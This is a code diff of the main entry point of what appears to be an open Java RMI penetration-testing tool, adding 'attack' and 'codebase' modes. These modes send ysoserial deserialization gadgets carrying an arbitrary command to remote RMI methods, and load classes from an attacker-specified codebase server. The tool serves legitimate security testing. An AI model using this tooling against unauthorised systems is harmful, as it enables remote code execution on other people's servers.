@@ -1,253 +1,236 @@
 package de.qtc.rmg;
 
-import java.io.File;
-import java.io.FileInputStream;
 import java.io.IOException;
-import java.io.InputStream;
-import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.HashSet;
 import java.util.List;
 import java.util.Properties;
 
 import org.apache.commons.cli.CommandLine;
-import org.apache.commons.cli.CommandLineParser;
-import org.apache.commons.cli.DefaultParser;
-import org.apache.commons.cli.HelpFormatter;
-import org.apache.commons.cli.Option;
-import org.apache.commons.cli.Options;
-import org.apache.commons.cli.ParseException;
-import org.apache.commons.io.FileUtils;
 
+import de.qtc.rmg.exceptions.UnexpectedCharacterException;
+import de.qtc.rmg.internal.ArgumentParser;
+import de.qtc.rmg.internal.MethodCandidate;
 import de.qtc.rmg.io.Formatter;
 import de.qtc.rmg.io.Logger;
-import de.qtc.rmg.utils.ClassWriter;
-import de.qtc.rmg.utils.JavaUtils;
+import de.qtc.rmg.io.WordlistHandler;
+import de.qtc.rmg.operations.MethodAttacker;
+import de.qtc.rmg.operations.MethodGuesser;
+import de.qtc.rmg.utils.RMGUtils;
 import de.qtc.rmg.utils.RMIWhisperer;
-import de.qtc.rmg.utils.Security;
+import de.qtc.rmg.utils.SampleWriter;
+import javassist.CannotCompileException;
+import javassist.NotFoundException;
 
 public class Starter {
 
     private static String defaultConfiguration = "/config.properties";
 
+    @SuppressWarnings({ "rawtypes", "deprecation", "unchecked" })
     public static void main(String[] argv) {
 
-        Options options = new Options();
+        ArgumentParser parser = new ArgumentParser();
+        CommandLine commandLine = parser.parse(argv);
 
-        Option name = new Option(null, "bound-name", true, "guess only on the specified bound name");
-        name.setRequired(false);
-        options.addOption(name);
+        parser.checkArgumentCount(2);
+        String action = "enum";
+        String host = parser.getPositionalString(0);
+        int port = parser.getPositionalInt(1);
 
-        Option build = new Option(null, "build-folder", true, "location of the build folder");
-        build.setRequired(false);
-        options.addOption(build);
+        if( parser.getArgumentCount() >= 3 ) {
+            action = parser.getPositionalString(2);
 
-        Option classes = new Option(null, "classes", false, "show classes of identified bound names");
-        classes.setRequired(false);
-        options.addOption(classes);
+            if( action.equals("attack") || action.equals("codebase")) {
+                parser.checkArgumentCount(5);
 
-        Option configOption = new Option(null, "config", true, "path to a configuration file");
-        configOption.setRequired(false);
-        options.addOption(configOption);
-
-        Option guess = new Option(null, "guess", false, "guess valid methods on bound names");
-        guess.setRequired(false);
-        options.addOption(guess);
-
-        Option help = new Option(null, "help", false, "display help message");
-        help.setRequired(false);
-        options.addOption(help);
-
-        Option jsonOutput = new Option(null, "json", false, "output in json format");
-        jsonOutput.setRequired(false);
-        options.addOption(jsonOutput);
-
-        Option javac = new Option(null, "javac-path", true, "location of the javac executable");
-        javac.setRequired(false);
-        options.addOption(javac);
-
-        Option outputs = new Option(null, "sample-folder", true, "folder used for sample generation");
-        outputs.setRequired(false);
-        options.addOption(outputs);
-
-        Option sources = new Option(null, "source-folder", true, "location of the source folder");
-        sources.setRequired(false);
-        options.addOption(sources);
-
-        Option threads = new Option(null, "threads", true, "maximum number of threads (default: 5)");
-        threads.setRequired(false);
-        options.addOption(threads);
-
-        Option templates = new Option(null, "template-folder", true, "location of the template folder");
-        templates.setRequired(false);
-        options.addOption(templates);
-
-        Option quite = new Option(null, "quite", false, "less verbose output format");
-        quite.setRequired(false);
-        options.addOption(quite);
-
-        Option samples = new Option(null, "create-samples", false, "create sample classes for identified methods");
-        samples.setRequired(false);
-        options.addOption(samples);
-
-        Option trusted = new Option(null, "trusted", false, "disable filtering for bound and class names (dangerous)");
-        trusted.setRequired(false);
-        options.addOption(trusted);
-
-        Option ssl = new Option(null, "ssl", false, "use SSL for the rmi-registry connection");
-        ssl.setRequired(false);
-        options.addOption(ssl);
-
-        Option follow = new Option(null, "follow", false, "follow redirects to different servers");
-        follow.setRequired(false);
-        options.addOption(follow);
-
-        CommandLineParser parser = new DefaultParser();
-        HelpFormatter formatter = new HelpFormatter();
-        CommandLine commandLine = null;
-
-        String helpString = "rmg [options] [clean | <ip> <port>]\n";
-        helpString += "RMI enumeration tool. List and guess methods on Java RMI endpoints.\n\n";
-        helpString += "Positional arguments:\n";
-        helpString += "    clean                    Removes all temporary directories.\n";
-        helpString += "    ip                       IP address of the target host\n";
-        helpString += "    port                     Port number of the RMI registry\n\n";
-        helpString += "Optional arguments:\n";
-
-        try {
-            commandLine = parser.parse(options, argv);
-        } catch (ParseException e) {
-            System.err.println("Error: " + e.getMessage() + "\n");
-            formatter.printHelp(helpString, options);
-            System.exit(1);
-        }
-
-        if( commandLine.hasOption("help") ) {
-            formatter.printHelp(helpString, options);
-            System.exit(0);
-        }
-
-         /* The default configuration values are loaded from the default configuration file inside the .jar */
-        Properties config = new Properties();
-        Starter.loadConfig(defaultConfiguration, config, false);
-
-        /* If an additional configuration file is specified on the command line, we overwrite specified properties */
-        String additionalConfig = commandLine.getOptionValue("config", null);
-        if( additionalConfig != null )
-            Starter.loadConfig(additionalConfig, config, true);
-
-        int threadCount = Integer.valueOf(commandLine.getOptionValue("threads", config.getProperty("threads")));
-        String templateFolder = commandLine.getOptionValue("template-folder", config.getProperty("templateFolder"));
-        String sampleFolder = commandLine.getOptionValue("sample-folder", config.getProperty("sampleFolder"));
-        String sourceFolder = commandLine.getOptionValue("source-folder", config.getProperty("sourceFolder"));
-        String buildFolder = commandLine.getOptionValue("build-folder", config.getProperty("buildFolder"));
-        String javacPath = commandLine.getOptionValue("javac-path", config.getProperty("javacPath"));
-        String boundName = commandLine.getOptionValue("bound-name", null);
-        Security.trusted = commandLine.hasOption("trusted");
-
-        File[] tmpDirectories = new File[] { new File(sourceFolder), new File(buildFolder), new File(sampleFolder) };
-
-        List<String> remainingArgs = commandLine.getArgList();
-        if( remainingArgs.size() == 1 && remainingArgs.get(0).equals("clean") ) {
-            for(File dir : tmpDirectories) {
-
-                try {
-                    Logger.println("Deleting directory " + dir.getCanonicalPath());
-                    FileUtils.deleteDirectory(dir);
-                } catch (IOException e) {
-                    Logger.eprintln("Error during cleanup.");
+                if(!commandLine.hasOption("signature")) {
+                    Logger.eprintlnMixedYellow("The", "--signature", "option is required for " + action + " mode.");
+                    RMGUtils.exit();
                 }
             }
-            System.exit(0);
+
+            if( action.equals("codebase" )) {
+                String serverAddress = parser.getPositionalString(3);
+
+                if( !serverAddress.startsWith("http") )
+                    serverAddress = "http://" + serverAddress + "/";
+
+                if( !serverAddress.endsWith("/") )
+                    serverAddress = serverAddress + "/";
+
+                System.setProperty("java.rmi.server.codebase", serverAddress);
+            }
         }
 
-        if( remainingArgs.size() != 2 ) {
-            System.err.println("Error: insufficient number of arguments.\n");
-            formatter.printHelp(helpString, options);
-            System.exit(1);
+        Properties config = new Properties();
+        RMGUtils.loadConfig(defaultConfiguration, config, false);
+
+        String additionalConfig = commandLine.getOptionValue("config", null);
+        if( additionalConfig != null )
+            RMGUtils.loadConfig(additionalConfig, config, true);
+
+        int legacyMode = parser.getLegacyMode();
+        int argumentPos = Integer.valueOf(commandLine.getOptionValue("argument-position", "-1"));
+        int threadCount = Integer.valueOf(commandLine.getOptionValue("threads", config.getProperty("threads")));
+        String sampleFolder = commandLine.getOptionValue("sample-folder", config.getProperty("sample-folder"));
+        String wordlistFile = commandLine.getOptionValue("wordlist-file", config.getProperty("wordlist-file"));
+        String templateFolder = commandLine.getOptionValue("template-folder", config.getProperty("template-folder"));
+        String wordlistFolder = commandLine.getOptionValue("wordlist-folder", config.getProperty("wordlist-folder"));
+        String ysoserialPath = commandLine.getOptionValue("yso", config.getProperty("ysoserial-path"));
+        String functionSignature = commandLine.getOptionValue("signature", null);
+        String boundName = commandLine.getOptionValue("bound-name", null);
+
+        Logger.verbose = !commandLine.hasOption("json");
+        boolean sslValue = commandLine.hasOption("ssl");
+        boolean followRedirect = commandLine.hasOption("follow");
+        boolean updateWordlists = commandLine.hasOption("update");
+        boolean createSamples = commandLine.hasOption("create-samples");
+        boolean zeroArg = commandLine.hasOption("zero-arg");
+
+        if( commandLine.hasOption("no-color") ) {
+            Logger.disableColor();
         }
 
-        String host = remainingArgs.get(0);
-        int port = 1090;
-
-        try {
-            port = Integer.valueOf(remainingArgs.get(1));
-        } catch( Exception e ) {
-            System.err.println("Error: Specified port is not an integer.\n");
-            formatter.printHelp(helpString, options);
-            System.exit(1);
-        }
-
-        Logger.verbose = ! commandLine.hasOption("quite") && ! commandLine.hasOption("json");
         Formatter format = new Formatter(commandLine.hasOption("json"));
         RMIWhisperer rmi = new RMIWhisperer();
 
-        boolean sslValue = commandLine.hasOption("ssl");
-        boolean followRedirect = commandLine.hasOption("follow");
+        RMGUtils.init();
+        RMGUtils.enableCodebase();
+        RMGUtils.disableWarning();
+
         rmi.connect(host, port, sslValue, followRedirect);
-
         String[] boundNames = rmi.getBoundNames();
-        ArrayList<HashMap<String,String>> boundClasses = null;
 
-        if( commandLine.hasOption("classes") || commandLine.hasOption("guess") ) {
-            boundClasses = rmi.getClassNames(boundNames);
-        }
+        ArrayList<HashMap<String,String>> boundClasses = rmi.getClassNames(boundNames);
+        HashMap<String,String> allClasses = (HashMap<String, String>) boundClasses.get(0).clone();
+        allClasses.putAll(boundClasses.get(1));
 
-        if( !commandLine.hasOption("guess") ) {
-            format.listBoundNames(boundNames, boundClasses);
-            System.exit(0);
-        }
+        MethodCandidate candidate = null;
+        if( functionSignature != null ) {
 
-        if( boundClasses.get(1).size() <= 0 ) {
-            format.listBoundNames(boundNames, boundClasses);
-            Logger.eprintln("No unknown classes identified.");
-            Logger.eprintln("Guessing methods not necessary.");
-            System.exit(0);
-        }
+            try {
+                candidate = new MethodCandidate(functionSignature);
 
-        /* If execution reaches this point, we need the template folder */
-        File templatesFolder = new File(templateFolder);
-        if( !templatesFolder.exists() ) {
-            Logger.eprintln("Error: Template folder '" + templateFolder + "' does not exist");
-            Logger.eprintln("RMG attack requires an existing template folder.");
-            System.exit(1);
-        }
-
-        for(File dir : tmpDirectories) {
-             if( !dir.exists() ) {
-                 Logger.print("Creating required folder '" + dir.getName() + "'... ");
-                 dir.mkdir();
-                 Logger.printlnPlain("done.");
-             }
-        }
-
-        ClassWriter classWriter = new ClassWriter(templateFolder, sourceFolder, sampleFolder, buildFolder, sslValue, followRedirect);
-        JavaUtils javaUtils = new JavaUtils(javacPath, buildFolder, sampleFolder);
-        MethodGuesser guesser = new MethodGuesser(rmi, boundClasses.get(1), classWriter, javaUtils);
-
-        boolean createSamples = commandLine.hasOption("create-samples");
-        HashMap<String,ArrayList<Method>> results = guesser.guessMethods(boundName, threadCount, createSamples);
-
-        format.listGuessedMethods(results);
-    }
-
-
-    private static void loadConfig(String filename, Properties prop, boolean extern) {
-
-        InputStream configStream = null;
-        try {
-            if( extern ) {
-                configStream = new FileInputStream(filename);
-            } else {
-                configStream = Starter.class.getResourceAsStream(filename);
+            } catch (CannotCompileException | NotFoundException e) {
+                Logger.eprintln("Supplied method signature seems to be invalid.");
+                Logger.eprintlnMixedYellow("The following exception was caught:", e.getMessage());
+                RMGUtils.exit();
             }
+        }
 
-        prop.load(configStream);
-        configStream.close();
+        switch( action ) {
 
-        } catch( IOException e ) {
-            Logger.eprintln("Unable to load properties file '" + filename + "'");
-            System.exit(1);
+            case "guess":
+                if( !RMGUtils.containsUnknown(boundClasses.get(1)) )
+                    break;
+
+                HashSet<MethodCandidate> candidates = new HashSet<MethodCandidate>();
+                if( candidate != null ) {
+                    candidates.add(candidate);
+
+                } else {
+
+                    try {
+                        WordlistHandler wlHandler = new WordlistHandler(wordlistFile, wordlistFolder, updateWordlists);
+                        candidates = wlHandler.getWordlistMethods();
+                    } catch( IOException e ) {
+                        Logger.eprintlnMixedYellow("Caught exception while reading wordlist file(s):", e.getMessage());
+                        RMGUtils.exit();
+                    }
+                }
+
+                MethodGuesser guesser = new MethodGuesser(rmi, boundClasses.get(1), candidates);
+                HashMap<String,ArrayList<MethodCandidate>> results = guesser.guessMethods(boundName, threadCount, createSamples, zeroArg, legacyMode);
+
+                format.listGuessedMethods(results);
+                if( !createSamples )
+                    break;
+
+                Logger.println("");
+                Logger.println("Starting creation of sample files:");
+                Logger.println("");
+                Logger.increaseIndent();
+
+                try {
+                    String className;
+                    SampleWriter writer;
+                    writer = new SampleWriter(templateFolder, sampleFolder, sslValue, followRedirect, legacyMode);
+
+                    for(String name : results.keySet()) {
+
+                        Logger.printlnMixedYellow("Creating samples for bound name", name);
+                        Logger.increaseIndent();
+
+                        className = boundClasses.get(1).get(name);
+                        writer.createInterface(name, className, (List<MethodCandidate>)results.get(name));
+                        writer.createSamples(name, className, (List<MethodCandidate>)results.get(name), rmi);
+
+                        Logger.decreaseIndent();
+                    }
+
+                } catch (IOException | CannotCompileException | NotFoundException e) {
+                    Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during sample creation.");
+                    RMGUtils.stackTrace(e);
+                    RMGUtils.exit();
+
+                } catch (UnexpectedCharacterException e) {
+                    Logger.eprintlnMixedYellow("Caught", "UnexpectedCharacterException", "during sample creation.");
+                    Logger.eprintln("This is caused by special characters within bound- or classes names.");
+                    Logger.eprintlnMixedYellow("You can enforce sample cration with the", "--trusted", "switch.");
+                    RMGUtils.exit();
+                }
+
+                Logger.decreaseIndent();
+                break;
+
+            case "attack":
+
+                String gadget = parser.getPositionalString(3);
+                String command = parser.getPositionalString(4);
+
+                if(ysoserialPath == null) {
+                    Logger.eprintlnMixedYellow("Path for", "ysoserial.jar", "is null.");
+                    Logger.increaseIndent();
+                    Logger.eprintlnMixedYellow("Check your configuration file or specify it on the command line using the", "--yso", "parameter");
+                    RMGUtils.exit();
+                }
+
+                Object payload = RMGUtils.getPayloadObject(ysoserialPath, gadget, command);
+                MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
+                attacker.attack(payload, boundName, argumentPos, "ysoserial", legacyMode);
+
+                break;
+
+            case "codebase":
+
+                String className = parser.getPositionalString(4);
+
+                payload = null;
+
+                try {
+                    payload = RMGUtils.makeSerializableClass(className);
+                    payload = ((Class)payload).newInstance();
+
+                } catch (CannotCompileException | NotFoundException | InstantiationException | IllegalAccessException e) {
+                    Logger.eprintlnMixedYellow("Caught unexpected", e.getClass().getName(), "during payload creation.");
+                    RMGUtils.stackTrace(e);
+                    RMGUtils.exit();
+                }
+
+                attacker = new MethodAttacker(rmi, allClasses, candidate);
+                attacker.attack(payload, boundName, argumentPos, "codebase", legacyMode);
+
+                break;
+
+            default:
+                Logger.printlnMixedYellow("Unknown action:", action, ".");
+                Logger.printlnMixedBlue("Performing default action:", "enum");
+
+            case "enum":
+                format.listBoundNames(boundNames, boundClasses);
+                Logger.println("");
+                format.listCodeases();
         }
     }
 }
